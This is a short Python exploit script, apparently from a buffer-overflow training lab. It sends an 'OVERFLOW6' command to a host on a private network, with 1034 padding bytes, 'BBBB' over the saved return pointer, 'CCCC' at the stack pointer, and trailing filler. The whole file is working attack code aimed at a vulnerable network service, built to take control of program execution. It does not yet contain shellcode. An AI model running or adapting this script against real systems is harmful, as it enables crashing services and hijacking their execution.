#!/usr/bin/env python3
import socket
RHOST = "192.168.112.135"
RPORT = 1337

buf_length = 1500
prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * 1034

buffer = ""
buffer += prefix
buffer += overflow
buffer += "BBBB"	# overwrite saved return pointer
buffer += "CCCC"	# ESP
buffer += "D" * (buf_length - (len(buffer) - len(prefix))) # trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((RHOST, RPORT))
	print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
	s.send(bytes(buffer, "latin-1"))
	print("[+] Done!")
except:
	print("[-] Unable to establish connection to the target.")
